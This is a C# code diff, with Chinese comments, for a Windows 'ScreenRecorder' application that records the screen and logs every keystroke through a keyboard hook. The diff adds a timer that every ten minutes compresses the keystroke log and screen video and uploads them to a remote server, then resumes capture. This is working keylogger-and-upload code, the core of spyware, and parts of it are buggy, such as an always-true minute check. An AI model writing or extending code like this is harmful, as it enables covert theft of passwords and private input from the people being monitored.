@@ -13,6 +13,7 @@ using System.IO.Compression;
 using System.Net.Http;
 using SevenZip;
 using SevenZip.Sdk;
+using System.Timers;
 
 namespace ScreenRecorder
 {
@@ -22,13 +23,16 @@ namespace ScreenRecorder
         private KeyboardHook? keyboardHook;
         private StreamWriter? keylogWriter;
         private string? keylogPath;
-        private Timer? screenCaptureTimer;
+        private System.Windows.Forms.Timer? screenCaptureTimer;
         private Rectangle screenBounds;
         private string? videoOutputPath;
         private int frameRate = 10; // 默认帧率
         private int frameCount = 0;
         private int videoQuality = 20; // 视频质量参数，范围0-100
         private string remoteServerUrl = "http://localhost/upload"; // 远程存储服务器地址
+        private System.Timers.Timer? autoUploadTimer; // 自动上传定时器
+        private DateTime lastAutoUploadTime; // 上次自动上传时间
+        private int autoUploadIntervalMinutes = 10; // 自动上传间隔（分钟）
         
         // AVI视频录制相关
         private AviWriter? aviWriter;
@@ -148,13 +152,16 @@ namespace ScreenRecorder
                 videoStream.Name = "Screen Capture";
 
                 // 启动屏幕捕获定时器
-                screenCaptureTimer = new Timer();
+                screenCaptureTimer = new System.Windows.Forms.Timer();
                 screenCaptureTimer.Interval = 1000 / frameRate; // 根据帧率设置间隔
                 screenCaptureTimer.Tick += ScreenCaptureTimer_Tick;
                 screenCaptureTimer.Start();
 
                 // 启动键盘钩子
                 keyboardHook?.Start();
+
+                // 初始化并启动自动上传定时器
+                InitializeAutoUploadTimer();
 
                 isRecording = true;
                 btnStartStop.Text = "停止录制";
@@ -199,6 +206,14 @@ namespace ScreenRecorder
                     aviWriter = null;
                 }
 
+                // 停止并释放自动上传定时器
+                if (autoUploadTimer != null)
+                {
+                    autoUploadTimer.Stop();
+                    autoUploadTimer.Dispose();
+                    autoUploadTimer = null;
+                }
+                
                 isRecording = false;
                 btnStartStop.Text = "开始录制";
                 lblStatus.Text = "状态: 就绪";
@@ -266,8 +281,14 @@ namespace ScreenRecorder
                     }
 
                     // 更新状态
-                    lblStatus.Text = $"状态: 正在录制 (已捕获 {frameCount} 帧)";
+                lblStatus.Text = $"状态: 正在录制 (已捕获 {frameCount} 帧)";
+                
+                // 检查是否需要自动上传（每分钟检查一次）
+                if (DateTime.Now.Minute % 1 == 0 && DateTime.Now.Second < 2)
+                {
+                    CheckAutoUpload();
                 }
+            }
             }
             catch (Exception ex)
             {
@@ -410,6 +431,152 @@ namespace ScreenRecorder
             }
         }
 
+        // 初始化自动上传定时器
+        private void InitializeAutoUploadTimer()
+        {
+            lastAutoUploadTime = DateTime.Now;
+            
+            autoUploadTimer = new System.Timers.Timer();
+            autoUploadTimer.Interval = 60000; // 每分钟检查一次
+            autoUploadTimer.Elapsed += AutoUploadTimer_Elapsed;
+            autoUploadTimer.Start();
+        }
+        
+        // 自动上传定时器事件处理
+        private void AutoUploadTimer_Elapsed(object? sender, ElapsedEventArgs e)
+        {
+            this.Invoke((MethodInvoker)delegate
+            {
+                CheckAutoUpload();
+            });
+        }
+        
+        // 检查是否需要自动上传
+        private void CheckAutoUpload()
+        {
+            if (!isRecording)
+                return;
+            
+            TimeSpan elapsedTime = DateTime.Now - lastAutoUploadTime;
+            if (elapsedTime.TotalMinutes >= autoUploadIntervalMinutes)
+            {
+                // 创建临时文件用于自动上传
+                CreateTemporaryFilesForAutoUpload();
+                lastAutoUploadTime = DateTime.Now;
+            }
+        }
+        
+        // 创建临时文件用于自动上传
+        private void CreateTemporaryFilesForAutoUpload()
+        {
+            if (string.IsNullOrEmpty(videoOutputPath) || string.IsNullOrEmpty(keylogPath))
+                return;
+            
+            try
+            {
+                // 关闭当前的AVI写入器和键盘记录器
+                if (keylogWriter != null)
+                {
+                    keylogWriter.WriteLine($"自动上传点: {DateTime.Now}");
+                    keylogWriter.Flush();
+                }
+                
+                if (aviWriter != null)
+                {
+                    aviWriter.Close();
+                    aviWriter = null;
+                }
+                
+                // 压缩并上传当前的视频文件
+                string autoUploadZipFilePath = CompressFilesForAutoUpload(videoOutputPath, keylogPath);
+                if (!string.IsNullOrEmpty(autoUploadZipFilePath))
+                {
+                    UploadToRemoteServer(autoUploadZipFilePath);
+                }
+                
+                // 创建新的视频文件继续录制
+                string newTimestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
+                string captureFolder = Path.GetDirectoryName(videoOutputPath);
+                
+                // 创建新的键盘记录文件
+                string newKeylogPath = Path.Combine(captureFolder, $"KeyLog_{newTimestamp}_Part.txt");
+                keylogWriter = new StreamWriter(newKeylogPath, true); // 追加模式
+                keylogWriter.WriteLine($"继续录制: {DateTime.Now}");
+                keylogWriter.Flush();
+                
+                // 创建新的视频文件
+                string newVideoPath = Path.Combine(captureFolder, $"ScreenRecording_{newTimestamp}_Part.avi");
+                
+                // 保存新的路径
+                keylogPath = newKeylogPath;
+                videoOutputPath = newVideoPath;
+                
+                // 创建新的AVI写入器
+                aviWriter = new AviWriter(videoOutputPath)
+                {
+                    FramesPerSecond = frameRate,
+                    EmitIndex1 = true
+                };
+                
+                // 创建新的视频流
+                videoStream = aviWriter.AddVideoStream();
+                videoStream.Width = screenBounds.Width;
+                videoStream.Height = screenBounds.Height;
+                videoStream.Codec = SharpAvi.CodecIds.MotionJpeg;
+                videoStream.BitsPerPixel = SharpAvi.BitsPerPixel.Bpp24;
+                videoStream.Name = "Screen Capture (Continued)";
+                
+                // 通知用户自动上传已完成
+                MessageBox.Show("自动上传完成，继续录制中...", "自动上传", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"自动上传过程中出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+        
+        // 自动上传的压缩方法（无用户交互）
+        private string CompressFilesForAutoUpload(string videoFilePath, string? keylogFilePath = null)
+        {
+            try
+            {
+                // 初始化SevenZipSharp库
+                SevenZipCompressor.SetLibraryPath(FindSevenZipLibrary());
+
+                // 创建压缩文件路径
+                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
+                string zipFilePath = Path.Combine(Path.GetDirectoryName(videoFilePath), "AutoUpload_ScreenCapture_" + timestamp + ".7z");
+
+                // 准备文件列表
+                List<string> filesToCompress = new List<string> { videoFilePath };
+                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
+                {
+                    filesToCompress.Add(keylogFilePath);
+                }
+
+                // 创建SevenZipCompressor实例并设置最大压缩率
+                SevenZipCompressor compressor = new SevenZipCompressor();
+                compressor.CompressionLevel = SevenZip.CompressionLevel.Ultra;
+                compressor.CompressionMethod = SevenZip.CompressionMethod.Lzma2;
+                compressor.CompressionMode = SevenZip.CompressionMode.Create;
+
+                // 不显示进度窗口，直接压缩
+                compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());
+
+                // 检查压缩是否成功
+                if (!File.Exists(zipFilePath))
+                {
+                    return string.Empty;
+                }
+
+                return zipFilePath;
+            }
+            catch (Exception)
+            {
+                return string.Empty;
+            }
+        }
+        
         // 查找7z库文件
         private string FindSevenZipLibrary()
         {
